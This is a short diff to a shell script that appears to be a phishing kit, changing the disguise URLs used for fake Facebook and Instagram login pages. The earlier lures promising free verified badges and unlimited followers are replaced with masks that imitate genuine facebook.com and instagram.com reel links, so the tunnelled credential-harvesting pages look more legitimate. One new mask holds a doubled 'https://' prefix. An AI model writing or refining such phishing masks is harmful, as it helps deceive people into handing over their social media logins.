@@ -620,7 +620,7 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='https://blue-verified-badge-for-facebook-free'
+			mask='https://www.facebook.com/move-the-simp'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
@@ -656,7 +656,7 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='https://get-unlimited-followers-for-instagram'
+			mask='https://https://www.instagram.com/reel/Cx3NcO8o4Fi/?igshid=NTc4MTIwNjQ2YQ=='
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
